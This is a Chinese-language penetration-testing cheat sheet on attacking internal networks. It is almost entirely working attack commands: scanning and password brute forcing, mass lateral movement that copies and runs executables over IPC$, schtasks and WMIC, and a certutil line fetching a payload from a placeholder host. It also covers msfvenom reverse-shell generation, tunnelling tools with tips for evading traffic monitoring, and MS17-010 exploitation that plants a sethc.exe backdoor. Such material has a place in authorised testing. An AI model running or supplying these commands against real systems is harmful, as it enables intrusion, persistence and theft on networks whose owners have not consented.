<h4 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h4><pre><code>https://github.com/ShawnDEvans/smbmap
</code></pre>
<h5 id="MSF-7"><a href="#MSF-7" class="headerlink" title="MSF"></a>MSF</h5><pre><code>#use auxiliary/scanner/smb/smb_version查询开启139，445端口主机
#use auxiliary/scanner/smb/smb_login 爆破
</code></pre>
<h5 id="NMAP-2"><a href="#NMAP-2" class="headerlink" title="NMAP"></a>NMAP</h5><pre><code>#nmap -sU -sS --script smb-enum-shares.nse -p 445 192.168. 1.119
</code></pre>
<h5 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h5><pre><code>&gt;for /l %a in (1,1,254) do start /min /low telnet 192.168.1.%a 445
</code></pre>
<h4 id="Linux-Samba服务"><a href="#Linux-Samba服务" class="headerlink" title="Linux Samba服务"></a>Linux Samba服务</h4><pre><code>端口一般139，弱口令连接
&gt;smbclient -L 192.168.0.110
&gt;smbclient &#39;\\192.168.0.110\IPC$&#39;
#use exploit/linux/samba/is_known_pipenamea
</code></pre>
<h4 id="MSF-8"><a href="#MSF-8" class="headerlink" title="MSF"></a>MSF</h4><h5 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h5><pre><code>#use auxiliary/scanner/portscan/tcp
#use auxiliary/scanner/portscan/ack
</code></pre>
<h5 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h5><pre><code>#use auxiliary/scanner/ftp/ftp_version 开启FTP的机器
#use auxiliary/scanner/ftp/anonymous 允许匿名登录的FTP
#use auxiliary/scanner/ftp/ftp_login FTP爆破
#use auxiliary/scanner/http/http_version 开启HTTP服务的
#use auxiliary/scanner/smb/smb_version 开启SMB服务的
#use auxiliary/scanner/smb/smb_enumshares 允许匿名登录的SMB
#use auxiliary/scanner/smb/smb_login SMB爆破
#use auxiliary/scanner/ssh/ssh_version 开启SSH的机器
#use auxiliary/scanner/ssh/ssh_login SSH爆破
#use auxiliary/scanner/telnet/telnet_version 开启TELNET服务的
#use auxiliary/scanner/telnet/telnet_login TELNET爆破
#use auxiliary/scanner/mysql/mysql_version 开启MYSQL服务的
#use auxiliary/scanner/mysql/mysql_login MYSQL爆破
#use auxiliary/scanner/mssql/mssql_ping 开启SQLSERVER服务的
#use auxiliary/scanner/mssql/mssql_login MSSQL爆破
#use auxiliary/scanner/postgres/postgres_version开启POSTGRE服务的
#use auxiliary/scanner/postgres/postgres_login POSTGRESQL爆破
#use auxiliary/scanner/oracle/tnslsnr_version 开启oracle数据库的
#use auxiliary/admin/oracle/oracle_login Oracle数据库爆破
#use auxiliary/scanner/http/title 扫描HTTP标题
#use auxiliary/scanner/rdp/rdp_scanner 开启RDP服务的
#use auxiliary/scanner/http/webdav_scanner
#use auxiliary/scanner/http/http_put 开启WEBDAV的
#use auxiliary/scanner/smb/smb_ms17_010 存在17010漏洞的
#use auxiliary/scanner/http/zabbix_login zabbix爆破
#use auxiliary/scanner/http/axis_login axis爆破
#use auxiliary/scanner/redis/redis_login redis爆破
</code></pre>
<h4 id="Nc"><a href="#Nc" class="headerlink" title="Nc"></a>Nc</h4><pre><code>&gt;nc -znv 192.168.0.98 1-65535
</code></pre>
<p><img src="321.png" alt="image"></p>
<pre><code>&gt;nc -v -w 1 192.168.0.110 -z 1-1000
&gt;for i in &#123;101..102&#125;; do nc -vv -n -w 1 192.168.0.$i 21-25 -z; done
</code></pre>
<h4 id="Masscan"><a href="#Masscan" class="headerlink" title="Masscan"></a>Masscan</h4><pre><code>$sudo apt-get install clang git gcc make libpcap-dev
$git clone https://github.com/robertdavidgraham/masscan
$cd masscan
$make 
&gt;masscan -p80,3389,1-65535 192.168.0.0/24
</code></pre>
<p><img src="322.png" alt="image"></p>
<h4 id="PTScan"><a href="#PTScan" class="headerlink" title="PTScan"></a>PTScan</h4><pre><code>友好识别web服务
https://github.com/phantom0301/PTscan/blob/master/PTscan.py
&gt;python PTscan.py &#123;-f /xxx/xxx.txt or -h 192.168.1&#125; [-p 21,80,3306]  [-m 50] [-t 10] [-n(不ping)] [-b(开启banner扫描)] [-r查找IP]
80,81,82,83,84,85,86,87,88,89,90,91,901,18080,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,443,8443,7001
</code></pre>
<h4 id="CobaltStrike-K8-Aggressor"><a href="#CobaltStrike-K8-Aggressor" class="headerlink" title="CobaltStrike+K8 Aggressor"></a>CobaltStrike+K8 Aggressor</h4><pre><code>https://github.com/k8gege/Aggressor
</code></pre>
<h5 id="存活主机"><a href="#存活主机" class="headerlink" title="存活主机"></a>存活主机</h5><pre><code>beacon&gt;Cscan 192.168.0.0/24 OnlinePC
</code></pre>
<p><img src="323.png" alt="image"></p>
<h5 id="MS17010"><a href="#MS17010" class="headerlink" title="MS17010"></a>MS17010</h5><pre><code>beacon&gt;Cscan 192.168.0.0/24 MS17010
</code></pre>
<p><img src="324.png" alt="image"></p>
<h5 id="操作系统信息"><a href="#操作系统信息" class="headerlink" title="操作系统信息"></a>操作系统信息</h5><pre><code>beacon&gt;Cscan 192.168.0.0/24 Osscan
</code></pre>
<p><img src="325.png" alt="image"></p>
<h5 id="内网站点banner、标题扫描"><a href="#内网站点banner、标题扫描" class="headerlink" title="内网站点banner、标题扫描"></a>内网站点banner、标题扫描</h5><pre><code>beacon&gt;Cscan 192.168.0.0/24 WebScan
</code></pre>
<h5 id="FTP爆破"><a href="#FTP爆破" class="headerlink" title="FTP爆破"></a>FTP爆破</h5><pre><code>上传账户密码文件user.txt、pass.txt到beacon目录(beacon&gt;pwd)
beacon&gt;Cscan 192.168.0.0/24 FtpScan
</code></pre>
<h5 id="WMI爆破windows账户密码"><a href="#WMI爆破windows账户密码" class="headerlink" title="WMI爆破windows账户密码"></a>WMI爆破windows账户密码</h5><pre><code>上传账户密码文件user.txt、pass.txt到beacon目录(beacon&gt;pwd)
beacon&gt;Cscan 192.168.0.0/24 WmiScan
</code></pre>
<h5 id="思科设备扫描"><a href="#思科设备扫描" class="headerlink" title="思科设备扫描"></a>思科设备扫描</h5><pre><code>beacon&gt;Cscan 192.168.0.0/24 CiscoScan
</code></pre>
<h5 id="枚举共享"><a href="#枚举共享" class="headerlink" title="枚举共享"></a>枚举共享</h5><pre><code>beacon&gt; EnumShare
</code></pre>
<h5 id="枚举SQL-SERVER数据库"><a href="#枚举SQL-SERVER数据库" class="headerlink" title="枚举SQL SERVER数据库"></a>枚举SQL SERVER数据库</h5><pre><code>beacon&gt; EnumMSSQL
</code></pre>
<h3 id="执行命令-amp-IPC-amp-计划任务"><a href="#执行命令-amp-IPC-amp-计划任务" class="headerlink" title="执行命令&amp;IPC&amp;计划任务"></a>执行命令&amp;IPC&amp;计划任务</h3><pre><code>建立连接
&gt;net use \\192.168.1.2\ipc$ &quot;password&quot; /user:domain\administrator
查看连接
&gt;net use
列文件
&gt;dir \\192.168.1.2\c$
查看系统时间
&gt;net time \\192.168.1.2
上传文件
&gt;copy 1.exe \\192.168.1.2\c$
下载文件
&gt;copy \\192.168.1.2\c$\1.exe 1.exe
批量IPC
@echo off
echo check ip addr config file…
if not exist ip.txt echo ip addr config file ip.txt does not exist! &amp; goto end
echo read and analysis file…
for /F &quot;eol=#&quot; %%i in (ip.txt) do start PsExec.exe \\%%i -accepteula -u administrator -p &quot;123456&quot; cmd &amp; start cmd /c PsExec.exe \\%%i -u administrator -p &quot;123456&quot; cmd
:end
exit
</code></pre>
<h4 id="AT"><a href="#AT" class="headerlink" title="AT"></a>AT</h4><pre><code>&gt;net use \\192.168.1.2\ipc$ &quot;password&quot; /user:domain\administrator
&gt;copy 1.exe \\192.168.1.2\c$
&gt;net time \\192.168.1.2
&gt;at \\192.168.1.2 1:00AM c:\1.exe
&gt;at \\192.168.1.2 1:00AM cmd.exe /c “ipconfig &gt;c:/1.txt”
&gt;type \\192.168.1.2\c$\1.txt
查看计划任务
&gt;at \\192.168.1.2
删除计划任务
&gt;at \\192.168.1.2 计划ID /delete
横向批量上线
&gt;atexec.exe ./administrator:pass@10.1.1.1 &quot;certutil.exe -urlcache -split -f http://youip.com:80/shell.txt c:/windows/debug/SysDug.exe&quot; 
&gt;atexec.exe ./administrator:pass@10.1.1.1 &quot;c:/windows/debug/SysDug.exe&quot; 
&gt;atexec.exe ./administrator:pass@10.1.1.1 &quot;certutil.exe -urlcache -split -f c:/windows/debug/SysDug.exe delete&quot;
</code></pre>
<h4 id="Schtasks-1"><a href="#Schtasks-1" class="headerlink" title="Schtasks"></a>Schtasks</h4><pre><code>&gt;net use \\192.168.0.55\ipc$ &quot;password&quot; /user:&quot;domain\administrator&quot;
&gt;schtasks /query /fo LIST /v 查看计划任务
上传文件
&gt;copy ok.exe \\192.168.0.55\c$\windows\temp
远程创建定时任务 
&gt;schtasks /create /s &quot;192.168.0.55&quot; /u &quot;admin&quot; /p &quot;qqq23&quot; /RL HIGHEST /F /tn &quot;windowsupdate&quot; /tr &quot;c:\windows\temp\ok.exe&quot; /sc DAILY /mo 1 /ST 20:28 /RU SYSTEM
查询远程创建的任务
&gt;schtasks /query /s &quot;192.168.0.55&quot; /U &quot;admin&quot; /P &quot;qqq23&quot; | findstr &quot;windowsupdate&quot; 
立即执行远程任务
&gt;schtasks /run /tn windowsupdate /s &quot;192.168.0.55&quot; /U &quot;admin&quot; /P &quot;qqq23&quot; 
删除定时任务 
&gt;schtasks /Delete /tn windowsupdate /F /s &quot;192.168.0.55&quot; /u &quot;admin&quot; /p &quot;qqq23&quot;
删除IPC
&gt;net user name /del /y
横向批量上线
&gt;for /f %i in (ip.txt) do net use \\%i\admin$ /user:&quot;administrator&quot; &quot;password&quot; &amp; if %errorlevel% equ 0 ( copy ok.exe \\%i\admin$\debug\ /Y ) &amp; wmic /NODE:&quot;%i&quot; /user:&quot;administrator&quot; /password:&quot;password&quot; PROCESS call create &quot;c:\windows\debug\ok.exe&quot; &amp; @ping 127.0.0.1 -n 8 &gt;nul &amp; net use \\%i\admin$ /del
</code></pre>
<h4 id="WMIC-1"><a href="#WMIC-1" class="headerlink" title="WMIC"></a>WMIC</h4><pre><code>&gt;net use \\192.168.0.55\ipc$ &quot;password&quot; /user:&quot;domain\administrator&quot;
&gt;copy ok.exe \\192.168.0.55\c$\windows\temp
&gt;wmic /NODE:&quot; 192.168.0.55&quot; /user:&quot;administrator&quot; /password:&quot;password&quot; PROCESS call create &quot;c:\windows\temp\ok.exe&quot;
&gt;del \\192.168.0.55\c$\windows\temp\ok.exe /F
&gt;net use \\192.168.0.55\c$ /del
</code></pre>
<h3 id="快速定位域管理登过的机器"><a href="#快速定位域管理登过的机器" class="headerlink" title="快速定位域管理登过的机器"></a>快速定位域管理登过的机器</h3><pre><code>&gt;psexec –accepteula @ips.txt –u admin –p pass@123 –c 1.bat
#1.bat内容
tasklist /v | find “域管理名字”
@echo off
echo check ip addr config file…
if not exist ip.txt echo ip addr config file ip.txt does not exist! &amp; goto end
echo read and analysis file…
for /F “eol=#” %%i in (ip.txt) do echo %%i &amp;(echo %%i &amp;tasklist /s %%i /u administrator /p pass@123 /v) &gt;&gt;d:\result.txt
:end
exit
</code></pre>
<h3 id="MSF添加路由"><a href="#MSF添加路由" class="headerlink" title="MSF添加路由"></a>MSF添加路由</h3><pre><code># route add 内网网卡ip 子网掩码 session的id
# route list
&amp;
Meterpreter&gt;run get_local_subnets查看网段信息再添加路由
# run autoroute -s内网网卡ip/24
# run autoroute -p 查看路由表
&amp;
Meterpreter&gt;run post/multi/manage/autoroute
</code></pre>
<h3 id="MSF管道监听"><a href="#MSF管道监听" class="headerlink" title="MSF管道监听"></a>MSF管道监听</h3><pre><code>在已经获得meterpreter的机器上配置管道监听器
meterpreter &gt; pivot add -t pipe -l 已控IP -n bgpipe -a x86 -p windows
生成
&gt;msfvenom -p windows/meterpreter/reverse_named_pipe PIPEHOST=已控IP PIPENAME=bgpipe -f exe -o pipe.exe.
</code></pre>
<h3 id="代理-1"><a href="#代理-1" class="headerlink" title="代理"></a>代理</h3><h4 id="SSH-2"><a href="#SSH-2" class="headerlink" title="SSH"></a>SSH</h4><h5 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h5><pre><code>SSH动态转发，是建立正向加密的socks通道
出网靶机编辑后restart ssh服务
#vim /etc/ssh/sshd_conf
AllowTcpForwarding yes 允许TCP转发
GatewayPorts yes   允许远程主机连接本地转发的端口
TCPKeepAlive yes    TCP会话保持存活
PasswordAuthentication yes  密码认证
外部攻击机执行
&gt;ssh -C -f -N -g -D 0.0.0.0:12138 root@出网靶机IP -p 22
MSF中设置全局代理或使用其他软件
&gt;setg proxies socks5:0.0.0.0:12138
即可进行攻击隔离区机器
</code></pre>
<p><img src="326.png" alt="image"><br><img src="327.png" alt="image"></p>
<h5 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h5><pre><code>#vim /etc/ssh/sshd_conf
AllowTcpForwarding yes 允许TCP转发
GatewayPorts yes   允许远程主机连接本地转发的端口
TCPKeepAlive yes    TCP会话保持存活
PasswordAuthentication yes  密码认证
ClientAliveInterval 修改为30-60保持连接
ClientAliveCountMax 取消注释 发送请求没响应自动断开次数
107是外网攻击机
内网靶机执行：
&gt;ssh -p 22 -qngfNTR 12138:127.0.0.1:22 root@192.168.0.107
</code></pre>
<p><img src="328.png" alt="image"></p>
<pre><code>攻击机执行
&gt;ssh -p 12138 -qngfNTD 12345 root@192.168.0.107
</code></pre>
<p><img src="329.png" alt="image"></p>
<pre><code>隧道建立，可使用代理软件配置攻击机外网IP:12345访问内网
</code></pre>
<p><img src="330.png" alt="image"></p>
<h5 id="SSH隧道-rc4双重加密"><a href="#SSH隧道-rc4双重加密" class="headerlink" title="SSH隧道+rc4双重加密"></a>SSH隧道+rc4双重加密</h5><pre><code>生成木马
&gt;msfvenom -p windows/x64/meterpreter/bind_tcp_rc4 rc4password=123456 lport=446 -f exe -o /var/www/html/bind.exe
MSF设置
&gt;setg proxies socks5:0.0.0.0:12138
&gt;use exploit/multi/handler
&gt;set payload windows/x64/meterpreter/bind_tcp_rc4
&gt;set rc4password 123456
&gt;set rhost 10.1.1.97
&gt;set lport 446
</code></pre>
<p><img src="331.png" alt="image"></p>
<h5 id="公网SSH隧道-Local-MSF"><a href="#公网SSH隧道-Local-MSF" class="headerlink" title="公网SSH隧道+Local MSF"></a>公网SSH隧道+Local MSF</h5><pre><code>&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp -e x64/shikata_ga_nai -i 5 -b ‘\x00’ LHOST=公网IP LPORT=12138 -f exe –o /var/www/html/1.exe
Handler监听本地IP:12138
SSH转发
&gt;ssh -N -R 12138:本地内网IP:12138 root@公网IP
</code></pre>
<h4 id="socks4a"><a href="#socks4a" class="headerlink" title="socks4a"></a>socks4a</h4><pre><code>#use auxiliary/server/socks4a
#set srvhost 0.0.0.0
#set srvport 1080
#run
多层网络
再多配置个端口
Win: Proxifier&amp; Sockscap64
Linux: proxychains&amp; 浏览器
&amp;
meterpreter &gt; ipconfig 
IP Address : 10.1.13.3 
meterpreter &gt; run autoroute -s 10.1.13.0/24 
meterpreter &gt; run autoroute -p 
10.1.13.0 255.255.255.0 Session 1 
meterpreter &gt; bg 
msf auxiliary(tcp) &gt; use exploit/windows/smb/psexec 
msf exploit(psexec) &gt; set RHOST 10.1.13.2 
msf exploit(psexec) &gt; exploit 
</code></pre>
<h4 id="socks5"><a href="#socks5" class="headerlink" title="socks5"></a>socks5</h4><pre><code>#use auxiliary/server/socks5
#set srvhost 0.0.0.0
#set srvport 1080
#run
浏览器
</code></pre>
<h4 id="基于web的socks5"><a href="#基于web的socks5" class="headerlink" title="基于web的socks5"></a>基于web的socks5</h4><h5 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a>reGeorg</h5><pre><code>https://github.com/sensepost/reGeorg
&gt;python reGeorgSocksProxy.py -u http://靶机/tunnel.aspx -l 外网IP -p 10080
打开Proxifier，更改为脚本指定的端口10080
</code></pre>
<p><img src="332.png" alt="image"></p>
<pre><code>或proxychains
#vim /etc/proxychains.conf
去掉dynamic_chain注释&gt;添加socks5 127.0.0.1 10080
</code></pre>
<p><img src="333.png" alt="image"></p>
<pre><code>或MSF
&gt;setg proxies socks5:外网IP:10080
&gt;setg ReverseAllowProxy true 允许反向代理
</code></pre>
<p><img src="334.png" alt="image"></p>
<h5 id="Neo-reGeorg"><a href="#Neo-reGeorg" class="headerlink" title="Neo-reGeorg"></a>Neo-reGeorg</h5><pre><code>Step 1. 设置密码生成 tunnel.(aspx|ashx|jsp|jspx|php) 并上传到WEB服务器
$ python3 neoreg.py generate -k password
</code></pre>
<p><img src="335.png" alt="image"></p>
<pre><code>伪装页面
$ python3 neoreg.py generate -k &lt;you_password&gt; --file 404.html
Step 2. 使用 neoreg.py 连接WEB服务器，在本地建立 socks 代理
$ python3 neoreg.py -k password -u http://xx/tunnel.php
$ python3 neoreg.py -k &lt;you_password&gt; -u &lt;server_url&gt; --skip
开启代理
$ python neoreg.py -k &lt;you_password&gt; -l 外网IP -p 10081 -u http://xx/neo-tunnel.aspx
</code></pre>
<p><img src="336.png" alt="image"><br><img src="337.png" alt="image"></p>
<h5 id="ABPTTS端口转发"><a href="#ABPTTS端口转发" class="headerlink" title="ABPTTS端口转发"></a>ABPTTS端口转发</h5><pre><code>https://github.com/nccgroup/ABPTTS
端口转发
&gt;python abpttsfactory.py -o webshell 生成shell
./webshell目录下生成的相应脚本文件传入目标中
&gt;python abpttsclient.py -c webshell/config.txt -u &quot;http://目标网址/trans.aspx&quot; -f 攻击机IP:12345/目标IP:3389
</code></pre>
<p><img src="338.png" alt="image"><br><img src="339.png" alt="image"><br><img src="340.png" alt="image"></p>
<pre><code>ABPTTS转发内网其他机器端口
&gt;python abpttsclient.py -c webshell/config.txt -u http://192.168.0.98/qq.aspx -f 192.168.0.107:33890/10.1.1.105:3389
</code></pre>
<p><img src="341.png" alt="image"><br><img src="342.png" alt="image"></p>
<pre><code>要转发多个机器或多个端口
&gt;python abpttsclient.py -c webshell/config.txt -u http://192.168.0.98/qq.aspx -f 192.168.0.107:33890/10.1.1.105:3389 -f 192.168.0.107:33891/10.1.1.101:80 -f 192.168.0.107:33892/10.1.1.102:22
SSH代理一级网段
需要一台有权限的Linux靶机
&gt;python abpttsclient.py -c webshell/config.txt -u http://192.168.0.98/qq.aspx -f 192.168.0.107:33890/10.1.1.108:22
&gt;ssh -p 222 -qTfnN -D 0.0.0.0:1081 root@192.168.0.107
</code></pre>
<p><img src="343.png" alt="image"></p>
<pre><code>配置proxychains即可
</code></pre>
<p><img src="344.png" alt="image"></p>
<pre><code>SSH代理二级网段
需要靶机web权限，一级内网一台web权限
转发内网web出来传入abptts的shell
&gt;python abpttsclient.py -c webshell/config.txt -u http://192.168.0.98/qq.aspx -f 192.168.0.107:8080/10.1.1.108:80 
&gt;python abpttsclient.py -c webshell/config.txt -u http://192.168.0.107/qq.aspx -f 192.168.0.107:222/10.1.1.106:22
SSH连接192.168.0.107:222即可到达二级网络
反弹msf
kali生成bind型脚本
&gt;msfvenom -p linux/x64/shell_bind_tcp LPORT=12138 -f elf -o shell
在二级不出网linux上执行
将他的12138端口通过abptts转出
&gt;python abpttsclient.py -c webshell/config.txt -u http://192.168.0.98/qq.aspx -f 192.168.0.107:13128/10.1.1.101:12138
Msf本地监听13128即可
</code></pre>
<h5 id="Tunna转发"><a href="#Tunna转发" class="headerlink" title="Tunna转发"></a>Tunna转发</h5><pre><code>&gt;python proxy.py -u http://192.168.0.98/tunnel.aspx -l 12138 -r 3389 –v
</code></pre>
<p><img src="345.png" alt="image"></p>
<h4 id="Earthworm"><a href="#Earthworm" class="headerlink" title="Earthworm"></a>Earthworm</h4><p><img src="346.png" alt="image"></p>
<h5 id="正向-目标机存在外网IP-："><a href="#正向-目标机存在外网IP-：" class="headerlink" title="正向(目标机存在外网IP)："></a>正向(目标机存在外网IP)：</h5><pre><code>&gt;ew –s ssocksd –l 888
连接sockscap64靶机外网IP+端口888
</code></pre>
<h5 id="反弹socks5-目标机无外网IP-："><a href="#反弹socks5-目标机无外网IP-：" class="headerlink" title="反弹socks5(目标机无外网IP)："></a>反弹socks5(目标机无外网IP)：</h5><pre><code>外网攻击机：
&gt;ew -s rcsocks -l 1008 -e 888
-l为socks软件连接的端口，-e为目标主机和vps的通信端口。
靶机:
&gt;ew -s rssocks -d 外网IP -e 1008 
sockscap64连接攻击机外网IP+端口1008
</code></pre>
<h5 id="二级环境-A有外网，B内网无外网-："><a href="#二级环境-A有外网，B内网无外网-：" class="headerlink" title="二级环境(A有外网，B内网无外网)："></a>二级环境(A有外网，B内网无外网)：</h5><pre><code>靶机B:
&gt;ew –s ssocksd –l 888
靶机A:
&gt;ew –s lcx_tran –l 1080 –f 靶机B –g 888
Sockscap64连接靶机外网IP+端口 1080
</code></pre>
<h5 id="二级环境-A无外网，B内网无外网-："><a href="#二级环境-A无外网，B内网无外网-：" class="headerlink" title="二级环境(A无外网，B内网无外网)："></a>二级环境(A无外网，B内网无外网)：</h5><pre><code>外网攻击机：
&gt;ew –s lcx_listen –l 10800 –e 888
靶机B：
&gt;ew –s ssocksd –l 999
靶机A:
&gt;ew -s lcx_slave -d 外网 -e 8888 -f 靶机B -g 9999 
Sockscap64连接攻击机外网IP+端口 10080
</code></pre>
<h5 id="三级环境-A无外网-B内网无外网通A-C通B-："><a href="#三级环境-A无外网-B内网无外网通A-C通B-：" class="headerlink" title="三级环境(A无外网,B内网无外网通A,C通B)："></a>三级环境(A无外网,B内网无外网通A,C通B)：</h5><pre><code>外网攻击机：
&gt;ew -s rcsocks -l 1008 -e 888
靶机A：
&gt;ew -s lcx_slave -d 外网攻击机 -e 888 -f 靶机B -g 999
靶机B：
&gt;ew -s lcx_listen -l 999 -e 777
靶机C:
&gt;ew -s rssocks -d靶机B -e 777
Sockscap64连接攻击机外网IP+端口 1008
</code></pre>
<h4 id="Frp"><a href="#Frp" class="headerlink" title="Frp"></a>Frp</h4><pre><code>https://github.com/fatedier/frp/releases/
使用条件:目标主机通外网，拥有自己的公网ip
对攻击机外网服务端frps.ini进行配置
[common]
bind_port=8080
靶机客户端
[common]
server_addr=服务器端外网IP
server_port=8080
[socks5]
type=tcp
remote_port=12345
plugin=socks5
use_encryption=true
use_compression=true
以上是启用加密和压缩，能躲避流量分析设备。
上传frpc.exe和frpc.ini到目标服务器上,直接运行frpc.exe（在实战中可能会提示找不到配置文件，需要使用-c参数指定配置文件的路径frpc.exe -c 文件路径），可以修改文件名和配置名以混淆视听。
公网vps主机上运行./frps –c frps.ini
靶机执行./frpc –c frpc.ini
</code></pre>
<p><img src="347.png" alt="image"></p>
<pre><code>MSF中设置全局变量
&gt;setg proxies 公网IP:12345
&gt;setg ReverseAllowProxy true 运行反向代理
</code></pre>
<p><img src="348.png" alt="image"><br><img src="349.png" alt="image"></p>
<pre><code>结束攻击
tasklist 
taskkill /pid 进程号 -t –f
</code></pre>
<h4 id="SSF-1"><a href="#SSF-1" class="headerlink" title="SSF"></a>SSF</h4><pre><code>https://github.com/securesocketfunneling/ssf/releases
</code></pre>
<h5 id="正向socks代理"><a href="#正向socks代理" class="headerlink" title="正向socks代理"></a>正向socks代理</h5><pre><code>边界机器执行：
&gt;ssfd.exe -p 1080 linux执行：./ssfd -p 1080
</code></pre>
<p><img src="350.png" alt="image"></p>
<pre><code>攻击机执行：
&gt;ssf.exe -D 12138 -p 1080 192.168.0.98(边界机器IP)
</code></pre>
<p><img src="351.png" alt="image"></p>
<pre><code>本机配置proxychain或proxifier
</code></pre>
<p><img src="352.png" alt="image"></p>
<h5 id="反向socks代理"><a href="#反向socks代理" class="headerlink" title="反向socks代理"></a>反向socks代理</h5><pre><code>攻击机执行：
&gt;ssfd.exe -p 1080
</code></pre>
<p><img src="353.png" alt="image"></p>
<pre><code>内网机器执行：
&gt;ssf.exe -F 12138 -p 1080 192.168.0.106(攻击机IP)
</code></pre>
<p><img src="354.png" alt="image"><br><img src="355.png" alt="image"></p>
<h5 id="多级级联"><a href="#多级级联" class="headerlink" title="多级级联"></a>多级级联</h5><pre><code>多级内网机执行：
&gt;ssfd.exe -p 1080 -c config.json
Json文件加入字段
&quot;circuit&quot;: [ 
&#123;&quot;host&quot;: &quot;A中继机IP&quot;, &quot;port&quot;:&quot;1080&quot;&#125;, 
&#123;&quot;host&quot;: &quot;B中继机IP&quot;, &quot;port&quot;:&quot;1080&quot;&#125; 
],
所有中继机执行：
&gt;ssfd.exe -p 1080 -c config.json
边界机器执行：
&gt;ssf.exe -c config.json -p 1080 多级内网机IP -X 12138
边界机执行：
&gt;nc.exe 127.0.0.1 12138即可获得多级内网机cmdshell
</code></pre>
<h5 id="反弹shell-1"><a href="#反弹shell-1" class="headerlink" title="反弹shell"></a>反弹shell</h5><pre><code>攻击机执行：
&gt;ssfd.exe -p 1080 -c config.json
</code></pre>
<p><img src="356.png" alt="image"></p>
<pre><code>内网机器执行：
</code></pre>
<p><img src="357.png" alt="image"></p>
<pre><code>攻击机执行：
&gt;nc 127.0.0.1 12138
</code></pre>
<p><img src="358.png" alt="image"></p>
<h4 id="Shadowsocks"><a href="#Shadowsocks" class="headerlink" title="Shadowsocks"></a>Shadowsocks</h4><pre><code>https://github.com/shadowsocks/libQtShadowsocks/releases/download/v2.0.2/shadowsocks-libqss-v2.0.2-win64.7z
靶机新建配置文件1.json，内容为
&#123;
&quot;server&quot;:&quot;0.0.0.0&quot;,
&quot;server_port&quot;:13337,
&quot;local_address&quot;:&quot;127.0.0.1&quot;,
&quot;local_port&quot;:1080,
&quot;password&quot;:&quot;123456&quot;,
&quot;timeout&quot;:300,
&quot;method&quot;:&quot;aes-256-cfb&quot;,
&quot;fast_open&quot;:false,
&quot;workers&quot;: 1
&#125;
执行
&gt;shadowsocks-libqss.exe -c 1.json –S
攻击机配置
</code></pre>
<p><img src="359.png" alt="image"></p>
<pre><code>浏览器或其他攻击软件配置代理127.0.0.1:1080即可(需有http(s)/socks5功能)
</code></pre>
<p><img src="360.png" alt="image"><br><img src="361.png" alt="image"></p>
<h4 id="Goproxy"><a href="#Goproxy" class="headerlink" title="Goproxy"></a>Goproxy</h4><pre><code>https://github.com/snail007/goproxy/releases
靶机执行
&gt;proxy.exe socks -t tcp -p &quot;0.0.0.0:13337&quot;
</code></pre>
<p><img src="362.png" alt="image"></p>
<pre><code>攻击机配置Proxifier
</code></pre>
<p><img src="363.png" alt="image"></p>
<h4 id="Chisel"><a href="#Chisel" class="headerlink" title="Chisel"></a>Chisel</h4><pre><code>https://github.com/jpillora/chisel/releases
攻击机监听
&gt;chisel.exe server -p 12138 --reverse
</code></pre>
<p><img src="364.png" alt="image"></p>
<pre><code>靶机执行
&gt;chisel.exe client 192.168.0.102:12138 R:12345:127.0.0.1:12346
</code></pre>
<p><img src="365.png" alt="image"></p>
<pre><code>靶机执行
&gt;chisel.exe server -p 12346 --socks5
</code></pre>
<p><img src="366.png" alt="image"></p>
<pre><code>攻击机执行
&gt;chisel.exe client 127.0.0.1:12345 socks
</code></pre>
<p><img src="367.png" alt="image"></p>
<pre><code>当隧道建立成功时，攻击机本地会启动1080端口
</code></pre>
<p><img src="368.png" alt="image"></p>
<pre><code>即可使用
</code></pre>
<h4 id="代理软件"><a href="#代理软件" class="headerlink" title="代理软件"></a>代理软件</h4><pre><code>Sockscap64
Proxifier 
Proxychains
#vim /etc/proxychains.conf
去掉dynamic_chain注释&gt;添加socks4 127.0.0.1 1080
#cp /usr/lib/proxychains3/proxyresolv /usr/bin
</code></pre>
<h3 id="Ngrok内网穿透"><a href="#Ngrok内网穿透" class="headerlink" title="Ngrok内网穿透"></a>Ngrok内网穿透</h3><pre><code>https://ngrok.com/
https://www.ngrok.cc/
下载ngrok
#ngrok authtoken 授权码
#ngrok http 8080
#ngrok tcp 8888
</code></pre>
<h3 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h3><pre><code>扫描
#use auxiliary/scanner/smb/smb_ms17_010
#set rhosts 192.168.1.0/24
&amp;
#nmap -sT -p 445,139 -open -v -Pn --script=smb-vuln-ms17-010.nse 10.11.1.0/20
攻击
#use exploit/windows/smb/ms_17_010_eternalblue易蓝屏
#set payload windows/x64/meterpreter/reverse_tcp
#use auxiliary/admin/smb/ms17_010_command
#set command REG ADD \&quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\&quot; /t REG_SZ /v Debugger /d \&quot;C:\\windows\\system32\\cmd.exe\&quot; /f
</code></pre>
<h3 id="MS08-067"><a href="#MS08-067" class="headerlink" title="MS08_067"></a>MS08_067</h3><pre><code>#nmap -sT -p 445,139 -open -v -Pn --script=smb-vuln-ms08-067.nse 10.11.1.0/20
#use exploit/windows/smb/ms08_067_netapi
#set payload windows/meterpreter/reverse_tcp
CVE-2019-0708
</code></pre>
<h3 id="攻击MySQL数据库"><a href="#攻击MySQL数据库" class="headerlink" title="攻击MySQL数据库"></a>攻击MySQL数据库</h3><pre><code>#use auxiliary/scanner/mysql/mysql_version 主机发现
#use auxiliary/scanner/mysql/mysql_login MYSQL爆破
#use exploit/multi/mysql/mysql_udf_payload UDF提权
#use exploit/windows/mysql/mysql_mof MOF提权
#use auxiliary/admin/mysql/mysql_sql 执行命令
</code></pre>
<h3 id="攻击MSSQL数据库"><a href="#攻击MSSQL数据库" class="headerlink" title="攻击MSSQL数据库"></a>攻击MSSQL数据库</h3><pre><code>&gt;PowerShell -Command &quot;[System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()&quot; 列出域内mssql主机
https://github.com/NetSPI/PowerUpSQL
&gt;Get-SQLInstanceLocal          #发现本机SQLServer实例
